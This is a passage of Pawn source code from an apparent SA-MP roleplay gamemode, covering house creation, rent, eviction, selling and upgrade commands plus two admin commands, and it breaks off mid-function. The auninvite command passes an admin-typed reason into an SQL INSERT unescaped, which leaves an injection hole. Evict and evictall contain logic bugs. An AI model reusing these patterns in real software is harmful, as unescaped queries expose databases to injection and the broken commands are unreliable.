				format(PropertyString, sizeof(PropertyString),"{FFFFFF}House {A9C4E4}%d \n{A9C4E4}This house is for sale(/buyhouse) ! \n{FFFFFF}Description: {A9C4E4}%s \n{FFFFFF}Price: {A9C4E4}$%s \n{FFFFFF}Level: {A9C4E4}%d",i,HouseInfo[i][hDiscription],FormatNumber(HouseInfo[i][hValue]),HouseInfo[i][hLevel]);
				HouseLabel[i] = CreateDynamic3DTextLabel(PropertyString ,0x09FF00CC,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);

				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerPos(playerid, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]);
				housess++;
				SendClientMessage(playerid, COLOR_YELLOW, "House added interior: small.");
			}
			if(strcmp(house,"big",true) == 0)
			{
			    GetPlayerPos(playerid, pX, pY, pZ);
				SetPVarFloat(playerid, "pHeX", pX);
	        	SetPVarFloat(playerid, "pHeY", pY);
	        	SetPVarFloat(playerid, "pHeZ", pZ);
				SetPVarFloat(playerid, "pHiX", 1686.6067);
	            SetPVarFloat(playerid, "pHiY",  3843.6399);
	            SetPVarFloat(playerid, "pHiZ", 8.0741);
	            SetPVarInt(playerid, "pHiID", 0);
	            new i = housess+1;
				mysql_format(SQL, query, sizeof(query), "INSERT INTO houses (Owner, Lockk, Hel, Arm, Level, Rentabil, Rent, Owned, Discription, Value, Takings) VALUES('The State', '0', '0', '0', '10', '1', '500', '0', 'House', '10000000', '0')");
				mysql_tquery(SQL, query, "", "");

				HouseInfo[i][hID]                           = i;
   	    		HouseInfo[i][hEntrancex]                    = GetPVarFloat(playerid, "pHeX");
				HouseInfo[i][hEntrancey]                    = GetPVarFloat(playerid, "pHeY");
			 	HouseInfo[i][hEntrancez]                    = GetPVarFloat(playerid, "pHeZ");
        		HouseInfo[i][hExitx]                        = GetPVarFloat(playerid, "pHiX");
        		HouseInfo[i][hExity]                        = GetPVarFloat(playerid, "pHiY");
        		HouseInfo[i][hExitz]                        = GetPVarFloat(playerid, "pHiZ");
        		format(HouseInfo[i][hOwner], 64, "The State");
        		format(HouseInfo[i][hDiscription], 64, "House");
        		HouseInfo[i][hValue]						= 15000000;
        		SetPVarInt(playerid, "pHiVW", housess+HouseInfo[i][hValue]);
        		HouseInfo[i][hHel]                          = 0;
 			 	HouseInfo[i][hArm]                          = 0;
        		HouseInfo[i][hInterior]                     = GetPVarInt(playerid, "pHiID");
        		HouseInfo[i][hLock]                         = 0;
        		HouseInfo[i][hOwned]                        = 0;
        		HouseInfo[i][hRent]                         = 500;
        		HouseInfo[i][hRentabil]                     = 1;
        		HouseInfo[i][hTakings]                      = 0;
        		HouseInfo[i][hLevel]                        = 7;
        		HouseInfo[i][hVirtual]                      = GetPVarInt(playerid, "pHiVW");

        		mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Entrancex`='%f',`Entrancey`='%f',`Entrancez`='%f',`Exitx`='%f',`Exity`='%f',`Exitz`='%f',`Interior`='%d',`Virtual`='%d' WHERE `ID`='%d'",HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez],HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz],HouseInfo[i][hInterior],HouseInfo[i][hVirtual],i);
        		mysql_tquery(SQL,query,"","");

        		DeletePVar(playerid, "pHeX");
			    DeletePVar(playerid, "pHeY");
			    DeletePVar(playerid, "pHeZ");
			    DeletePVar(playerid, "pHiX");
			    DeletePVar(playerid, "pHeY");
			    DeletePVar(playerid, "pHeZ");
			    DeletePVar(playerid, "pHiID");
			    DeletePVar(playerid, "pHiVW");
			    DeletePVar(playerid, "pExt");
			    DeletePVar(playerid, "pInt");

        		DestroyDynamic3DTextLabel(HouseLabel[i]);
				format(PropertyString, sizeof(PropertyString),"{FFFFFF}House {A9C4E4}%d \n{A9C4E4}This house is for sale(/buyhouse) ! \n{FFFFFF}Description: {A9C4E4}%s \n{FFFFFF}Price: {A9C4E4}$%s \n{FFFFFF}Level: {A9C4E4}%d",i,HouseInfo[i][hDiscription],FormatNumber(HouseInfo[i][hValue]),HouseInfo[i][hLevel]);
				HouseLabel[i] = CreateDynamic3DTextLabel(PropertyString ,0x09FF00CC,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);

				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerPos(playerid, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]);
				housess++;
	            SendClientMessage(playerid, COLOR_YELLOW, "House added interior: big.");
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:movehouse(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 7)
		{
		    if(GetPlayerInterior(playerid) > 0 || GetPlayerVirtualWorld(playerid) > 0) return SendClientMessage(playerid, COLOR_RED, "You can move house only in virtual/interior 0.");
		    new house,Float:pX,Float:pY,Float:pZ,query[256];
		    if(sscanf(params, "d", house)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/movehouse <HouseID>");
		    GetPlayerPos(playerid, pX, pY, pZ);
		    HouseInfo[house][hEntrancex] = pX;
		    HouseInfo[house][hEntrancey] = pY;
		    HouseInfo[house][hEntrancez] = pZ;
		    new i = house;
		    mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Entrancex`='%f',`Entrancey`='%f',`Entrancez`='%f' WHERE `ID`='%d'",HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez],house);
    		mysql_tquery(SQL,query,"","");
    		format(query,sizeof(query),"You moved house %d to X:%f,Y:%f,Z:%f.",house,pX,pY,pZ);

			OnPropTextdrawUpdate(1, i);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:houseinterior(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 7)
		{
		    new house,Float:pX,Float:pY,Float:pZ,query[256];
		    if(sscanf(params, "d", house)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/houseinterior <HouseID>");
		    GetPlayerPos(playerid, pX, pY, pZ);
		    HouseInfo[house][hExitx] = pX;
		    HouseInfo[house][hExity] = pY;
		    HouseInfo[house][hExitz] = pZ;
		    HouseInfo[house][hInterior] = GetPlayerInterior(playerid);
		    HouseInfo[house][hVirtual] = GetPlayerVirtualWorld(playerid);
		    mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Exitx`='%f',`Exity`='%f',`Exitz`='%f',`Interior`='%d',`Virtual`='%d' WHERE `ID`='%d'",HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz],HouseInfo[house][hInterior],HouseInfo[house][hVirtual],house);
    		mysql_tquery(SQL,query,"","");
    		format(query,sizeof(query),"You changed house %d interior.",house);
    		SendClientMessage(playerid, COLOR_YELLOW, query);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:housewithdraw(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new idcasa,moneyhouse;
		if(sscanf(params, "id", idcasa,moneyhouse)) return SCM(playerid, -1, "/housewithdraw [1 - house / 2 - vip house] <suma>");
		if(idcasa == 1)
		{
			new bouse = PlayerInfo[playerid][pPhousekey],string[100];
			if(PlayerInfo[playerid][pPhousekey] != 999)
			{
				if(moneyhouse > 10000000) return SCM(playerid,COLOR_SERVER,"{FFB870}Maxim amount of money is $10,000,000.");
				if (moneyhouse >  HouseInfo[bouse][hTakings] || moneyhouse < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You dont have that much.");
				if (!PlayerToPoint(100, playerid,HouseInfo[bouse][hExitx],HouseInfo[bouse][hExity],HouseInfo[bouse][hExitz]))
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are to far from your house.");
					return 1;
				}
				else
				{
					GivePlayerCash(playerid,moneyhouse);
					HouseInfo[bouse][hTakings] = HouseInfo[bouse][hTakings]-moneyhouse;
					format(string, sizeof(string), "{B8FFDB}You Have Withdrawn $%s from your cashbox Total: $%s", FormatNumber(moneyhouse),FormatNumber(HouseInfo[bouse][hTakings]));
					Update(playerid, pCashx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Takings`='%d' WHERE `ID`='%d'",HouseInfo[bouse][hTakings],HouseInfo[bouse][hID]);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER, string);
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a house.");
			}
		}
		if(idcasa == 2)
		{
			new bouse = PlayerInfo[playerid][pPhousekey2],string[100];
			if(PlayerInfo[playerid][pPhousekey2] != 999)
			{
				if(moneyhouse > 10000000) return SCM(playerid,COLOR_SERVER,"{FFB870}Maxim amount of money is $10,000,000.");
				if (moneyhouse >  HouseInfo[bouse][hTakings] || moneyhouse < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You dont have that much.");
				if (!PlayerToPoint(100, playerid,HouseInfo[bouse][hExitx],HouseInfo[bouse][hExity],HouseInfo[bouse][hExitz]))
				{
					SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are to far from your house.");
					return 1;
				}
				else
				{
					GivePlayerCash(playerid,moneyhouse);
					HouseInfo[bouse][hTakings] = HouseInfo[bouse][hTakings]-moneyhouse;
					format(string, sizeof(string), "{B8FFDB}You Have Withdrawn $%s from your cashbox Total: $%s", FormatNumber(moneyhouse),FormatNumber(HouseInfo[bouse][hTakings]));
					Update(playerid, pCashx);
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Takings`='%d' WHERE `ID`='%d'",HouseInfo[bouse][hTakings],HouseInfo[bouse][hID]);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_SERVER, string);
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a house.");
			}
		}		
	}
	return 1;
}
CMD:evict(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new target,idcasa;
		if(sscanf(params, "id", idcasa)) return SCM(playerid, -1, "/evict [1 - house / 2 - vip house] <Name/Playerid>");
		if(idcasa == 1)
		{
			new bouse = PlayerInfo[playerid][pPhousekey];
			if (bouse != 999)
			{	
				if (target == playerid) return SendClientMessage(target, COLOR_SERVER, "{FFB870}You cant evict yourself.");
				if(IsPlayerConnected(target))
				{
					if(IsPlayerConnected(target))
					{
						if(PlayerInfo[target][pRented] == PlayerInfo[playerid][pPhousekey])
						{
							SendClientMessage(target, COLOR_SERVER, "You have been evicted.");
							SendClientMessage(playerid, COLOR_SERVER, "Player has been evicted.");
							PlayerInfo[target][pRented] = -1;
							new str[100];
							mysql_format(SQL,str,100,"UPDATE users SET `Rented`='-1' WHERE `name`='%s'",PlayerInfo[target][pNormalName]);
							mysql_tquery(SQL,str,"","");
							return 1;
						}
						else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player doesn't rent at your House.");
					}
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
		}
		if(idcasa == 2)
		{
			new bouse = PlayerInfo[playerid][pPhousekey2];
			if (bouse != 999)
			{	
				if (target == playerid) return SendClientMessage(target, COLOR_SERVER, "{FFB870}You cant evict yourself.");
				if(IsPlayerConnected(target))
				{
					if(IsPlayerConnected(target))
					{
						if(PlayerInfo[target][pRented] == PlayerInfo[playerid][pPhousekey2])
						{
							SendClientMessage(target, COLOR_SERVER, "You have been evicted.");
							SendClientMessage(playerid, COLOR_SERVER, "Player has been evicted.");
							PlayerInfo[target][pRented] = -1;
							new str[100];
							mysql_format(SQL,str,100,"UPDATE users SET `Rented`='-1' WHERE `name`='%s'",PlayerInfo[target][pNormalName]);
							mysql_tquery(SQL,str,"","");
							return 1;
						}
						else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player doesn't rent at your House.");
					}
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You do not own a house VIP.");
		}
	}
	return 1;
}
CMD:evictall(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new idcasa;
		if(sscanf(params, "i", idcasa)) return SCM(playerid, -1, "/evictall [1 - house / 2 - vip house]");
		if(idcasa == 1)
		{
			new bouse = PlayerInfo[playerid][pPhousekey];
			if (bouse != 999)
			{
				new str[100];
				mysql_format(SQL,str,100,"UPDATE users SET `Rented`='-1' WHERE `Rented`='%d'",PlayerInfo[playerid][pPhousekey]);
				mysql_tquery(SQL,str,"","");
				foreach(Player, i)
				{
					if(i != playerid)
					{
						if (PlayerInfo[i][pRented] == PlayerInfo[playerid][pPhousekey])
						{
							SendClientMessage(i, COLOR_SERVER, "You have been evicted from your house.");
							PlayerInfo[i][pRented] = -1;
							return 1;
						}
					}
				}
				SendClientMessage(playerid, COLOR_SERVER, "Everyone have been evicted.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
		}
		if(idcasa == 2)
		{
			new bouse = PlayerInfo[playerid][pPhousekey2];
			if (bouse != 999)
			{
				new str[100];
				mysql_format(SQL,str,100,"UPDATE users SET `Rented`='-1' WHERE `Rented`='%d'",PlayerInfo[playerid][pPhousekey2]);
				mysql_tquery(SQL,str,"","");
				foreach(Player, i)
				{
					if(i != playerid)
					{
						if (PlayerInfo[i][pRented] == PlayerInfo[playerid][pPhousekey2])
						{
							SendClientMessage(i, COLOR_SERVER, "You have been evicted from your house.");
							PlayerInfo[i][pRented] = -1;
							return 1;
						}
					}
				}
				SendClientMessage(playerid, COLOR_SERVER, "Everyone have been evicted.");
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You do not own a house VIP.");
		}		
	}
	return 1;
}
CMD:sellhousetostate(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new idcasa;
		if(sscanf(params, "i", idcasa)) return SCM(playerid, -1, "/sellhousetostate [1 - house / 2 - vip house]");
		if(idcasa == 1)
		{
			new playername[25],sendername[25];
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pPhousekey] == 999) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
			if(PlayerInfo[playerid][pPhousekey] != 999)
			{
				new house = PlayerInfo[playerid][pPhousekey];
				HouseInfo[house][hHel] = 0;
				HouseInfo[house][hArm] = 0;
				HouseInfo[house][hLock] = 0;
				HouseInfo[house][hOwned] = 0;
				PlayerInfo[playerid][pRented] = 0;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				strmid(HouseInfo[house][hOwner], "The State", 0, strlen("The State"), 255);
				ConsumingMoney[playerid] = 1;
				new cashh = floatround(floatmul(HouseInfo[house][hValue],0.70),floatround_ceil);
				GivePlayerCash(playerid,cashh);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				new string[70];
				format(string, sizeof(string), "~w~Congratulations~n~ You have sold your property for ~n~~g~$%d", cashh);
				GameTextForPlayer(playerid, string, 10000, 3);
				PlayerInfo[playerid][pPhousekey] = 999;
				PlayerInfo[playerid][pRented] = -1;
				if(PlayerInfo[playerid][pLocal] == house)
				{
					SetPlayerInterior(playerid,0);
					SetPlayerPosEx(playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]);
					PlayerInfo[playerid][pInt] = 0;
				}
				Update(playerid,pCashx);
				Update(playerid,pRentedx);
				Update(playerid,pPhousekeyx);
				new str2[256];
				mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Hel`='0',`Arm`='0',`Lockk`='0',`Owned`='0',`Owner`='The State' WHERE `ID`='%d'",HouseInfo[house][hID]);
				mysql_tquery(SQL,str2,"","");
				OnPropTextdrawUpdate(1,house);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
		}
		if(idcasa == 2)
		{
			new playername[25],sendername[25];
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pPhousekey2] == 999) return SendClientMessage(playerid, COLOR_ERROR, "You do not own a house VIP.");
			if(PlayerInfo[playerid][pPhousekey2] != 999)
			{
				new house = PlayerInfo[playerid][pPhousekey2];
				HouseInfo[house][hHel] = 0;
				HouseInfo[house][hArm] = 0;
				HouseInfo[house][hLock] = 0;
				HouseInfo[house][hOwned] = 0;
				PlayerInfo[playerid][pRented] = 0;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				strmid(HouseInfo[house][hOwner], "The State", 0, strlen("The State"), 255);
				ConsumingMoney[playerid] = 1;
				new cashh = floatround(floatmul(HouseInfo[house][hValue],0.70),floatround_ceil);
				GivePlayerCash(playerid,cashh);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				new string[70];
				format(string, sizeof(string), "~w~Congratulations~n~ You have sold your property for ~n~~g~$%d", cashh);
				GameTextForPlayer(playerid, string, 10000, 3);
				PlayerInfo[playerid][pPhousekey2] = 999;
				PlayerInfo[playerid][pRented] = -1;
				if(PlayerInfo[playerid][pLocal] == house)
				{
					SetPlayerInterior(playerid,0);
					SetPlayerPosEx(playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]);
					PlayerInfo[playerid][pInt] = 0;
				}
				Update(playerid,pCashx);
				Update(playerid,pRentedx);
				Update(playerid,pPhousekeyx);
				new str2[256];
				mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Hel`='0',`Arm`='0',`Lockk`='0',`Owned`='0',`Owner`='The State' WHERE `ID`='%d'",HouseInfo[house][hID]);
				mysql_tquery(SQL,str2,"","");
				OnPropTextdrawUpdate(1,house);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
		}		
	}
	return 1;
}
CMD:sellhouseto(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		SCM(playerid, COLOR_SERVER, "The sales / exchanges are made by order /trade.");
	}
	return 1;
}
CMD:setrent(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new idcasa;
		new fee;
		if(sscanf(params, "id", idcasa,fee)) return SCM(playerid, -1, "/setrent [1 - house / 2 - vip house] <Suma>");
		if(idcasa == 1)
		{
			new bouse = PlayerInfo[playerid][pPhousekey],string[25];
			if (bouse != 999)
			{
				if(fee < 1 || fee > 5000) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}Minimum rent is $1, maximum rent is $5,000.");
				HouseInfo[bouse][hRent] = fee;
				new str2[64];
				mysql_format(SQL,str2,64,"UPDATE `houses` SET `Rent`='%d' WHERE `ID`='%d'",fee,bouse);
				mysql_tquery(SQL,str2,"","");
				format(string, sizeof(string), "House rent set to $%s.", FormatNumber(HouseInfo[bouse][hRent]));
				SendClientMessage(playerid, COLOR_SERVER, string);
				OnPropTextdrawUpdate(1,PlayerInfo[playerid][pPhousekey]);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
		}
		if(idcasa == 2)
		{
			new bouse = PlayerInfo[playerid][pPhousekey2],string[25];
			if (bouse != 999)
			{
				if(fee < 1 || fee > 5000) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}Minimum rent is $1, maximum rent is $5,000.");
				HouseInfo[bouse][hRent] = fee;
				new str2[64];
				mysql_format(SQL,str2,64,"UPDATE `houses` SET `Rent`='%d' WHERE `ID`='%d'",fee,bouse);
				mysql_tquery(SQL,str2,"","");
				format(string, sizeof(string), "House rent set to $%s.", FormatNumber(HouseInfo[bouse][hRent]));
				SendClientMessage(playerid, COLOR_SERVER, string);
				OnPropTextdrawUpdate(1,PlayerInfo[playerid][pPhousekey2]);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You do not own a house VIP.");
		}		
	}
	return 1;
}
CMD:setrentable(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new idcasa,test;
		if(sscanf(params, "ii", idcasa,test)) return SCM(playerid, -1, "/setrentable [1 - house / 2 - vip house] [0 - Off / 1 - On]");
		if(test < 0 || test > 1) return SCM(playerid, COLOR_ERROR, "Error! 0 = Off | 1 = On - do not use other figures.");
		if(idcasa == 1)
		{
			new bouse = PlayerInfo[playerid][pPhousekey],string[30];
			if (bouse != 999)
			{
				HouseInfo[bouse][hRentabil] = test;
				new str2[64];
				mysql_format(SQL,str2,64,"UPDATE `houses` SET `Rentabil`='%d' WHERE `ID`='%d'",test,bouse);
				mysql_tquery(SQL,str2,"","");
				format(string, sizeof(string), "House rentable set to %d.", HouseInfo[bouse][hRentabil]);
				SendClientMessage(playerid, COLOR_SERVER, string);
				OnPropTextdrawUpdate(1,PlayerInfo[playerid][pPhousekey]);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}You don't own a house.");
		}	
		if(idcasa == 2)
		{
			new bouse = PlayerInfo[playerid][pPhousekey2],string[30];
			if (bouse != 999)
			{
				HouseInfo[bouse][hRentabil] = test;
				new str2[64];
				mysql_format(SQL,str2,64,"UPDATE `houses` SET `Rentabil`='%d' WHERE `ID`='%d'",test,bouse);
				mysql_tquery(SQL,str2,"","");
				format(string, sizeof(string), "House rentable set to %d.", HouseInfo[bouse][hRentabil]);
				SendClientMessage(playerid, COLOR_SERVER, string);
				OnPropTextdrawUpdate(1,PlayerInfo[playerid][pPhousekey2]);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You do not own a house VIP.");
		}
	}
	return 1;
}
CMD:hu(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new house = PlayerInfo[playerid][pPhousekey],
			playername[25],
			item;
		GetPlayerName(playerid, playername, sizeof(playername));
		if (house != 999)
		{
			if(sscanf(params, "d",item))
			{
				SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/hu <Item>");
				SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}(1) Health Upgrade $50,000.");
				SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}(2) Armour Upgrade $100,000.");
				return 1;
			}
			switch (item)
			{
				case 1:
				{
					if(GetPlayerCash(playerid) < 50000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have the cash to purchase this.");
					HouseInfo[house][hHel] = 1;
					GivePlayerCash(playerid,-50000);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_SERVER, "You can now heal yourself at home, type /heal.");
					new str2[64];
					mysql_format(SQL,str2,64,"UPDATE `houses` SET `Hel`='1' WHERE `ID`='%d'",house);
					mysql_tquery(SQL,str2,"","");
				}
				case 2:
				{
				    if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can't buy this, you are not a Cop,");
					if(GetPlayerCash(playerid) < 100000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have the cash to purchase this.");
					HouseInfo[house][hArm] = 1;
					GivePlayerCash(playerid,-100000);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_SERVER, "You can now get armour at home, Type /heal.");
					new str2[64];
					mysql_format(SQL,str2,64,"UPDATE `houses` SET `Arm`='1' WHERE `ID`='%d'",house);
					mysql_tquery(SQL,str2,"","");
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a house.");
	}
	return 1;
}
CMD:aimtest(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >=1)
	{
		if(Spectate[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not spectator.");
		new targetplayer = GetPlayerTargetPlayer(Spectate[playerid]);
		if(!IsPlayerConnected(targetplayer)) return SCM(playerid,COLOR_SERVER,"{FFB870}There is no player near your target.");
		new Float:x2,Float:y2,Float:z2;
		GetPlayerPos(targetplayer,x2,y2,z2);
		Aimx[targetplayer] = x2;
		Aimy[targetplayer] = y2;
		Aimz[targetplayer] = z2;
		new Float:x,Float:y,Float:z;
  		GetPlayerPos(Spectate[playerid],x,y,z);
	    SetPlayerPosEx(targetplayer, x,y+10,z);
	    SetTimerEx("aimback",3000,0,"d",targetplayer);
	    new string[256],giveplayer[25],executor[25];
	    GetPlayerName(Spectate[playerid], giveplayer, sizeof(giveplayer));
	    GetPlayerName(playerid, executor, sizeof(executor));
	    format(string, sizeof(string), "Admin %s used /aimtest on %s (%d).",executor,giveplayer,Spectate[playerid]);
		ABroadCast(COLOR_YELLOW,string,1);
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:auninvite(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] >= 4)
	{
		new id,string[256],giveplayer[30],sendername[MAX_PLAYER_NAME],reason[64],fpunish;
		if(sscanf(params, "uds[64]", id, fpunish, reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/auninvite <Name/Playerid> <FPunish> <Reason>");
 		GetPlayerName(id, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(IsPlayerConnected(id))
		{
			if(IsPlayerConnected(id))
    		{
    		    new string2[500],query[500];
    		    if(fpunish > 0)
    		    {
    				format(string, sizeof(string), "* You have been uninvited by Admin %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s.",sendername,NumeFactiune(PlayerInfo[id][pMember]),PlayerInfo[id][pRank],PlayerInfo[id][pFactionTime],fpunish,reason);
					SendClientMessage(id, COLOR_YELLOW, string);
					format(string, sizeof(string), "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s.",giveplayer,sendername,NumeFactiune(PlayerInfo[id][pMember]),PlayerInfo[id][pRank],PlayerInfo[id][pFactionTime],fpunish,reason);
					ABroadCast(COLOR_ERROR,string,1);
					format(string2, sizeof(string2), "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s.", giveplayer,sendername,DynamicFactions[PlayerInfo[id][pMember]][fName],PlayerInfo[id][pRank],PlayerInfo[id][pFactionTime],fpunish,reason);
					mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','%d')", string2, PlayerInfo[id][pSQLID], PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL,query,"","");
					PlayerInfo[id][pFpunish] = fpunish;
				}
				else if(fpunish < 1)
				{
				    format(string, sizeof(string), "* You have been uninvited by Admin %s from faction %s (rank %d) after %d days, without FP. Reason: %s.",sendername,NumeFactiune(PlayerInfo[id][pMember]),PlayerInfo[id][pRank],PlayerInfo[id][pFactionTime],reason);
					SendClientMessage(id, COLOR_YELLOW, string);
					format(string, sizeof(string), "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, without FP. Reason: %s.",giveplayer,sendername,NumeFactiune(PlayerInfo[id][pMember]),PlayerInfo[id][pRank],PlayerInfo[id][pFactionTime],reason);
					ABroadCast(COLOR_ERROR,string,1);
					format(string2, sizeof(string2), "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, without FP. Reason: %s.", giveplayer,sendername,DynamicFactions[PlayerInfo[id][pMember]][fName],PlayerInfo[id][pRank],PlayerInfo[id][pFactionTime],reason);
					mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','%d')", string2, PlayerInfo[id][pSQLID], PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL,query,"","");
					PlayerInfo[id][pFpunish] = 0;
				}
    			PlayerInfo[id][pMember] = 0;
                PlayerInfo[id][pLeader] = 0;
                PlayerInfo[id][pRank] = 0;
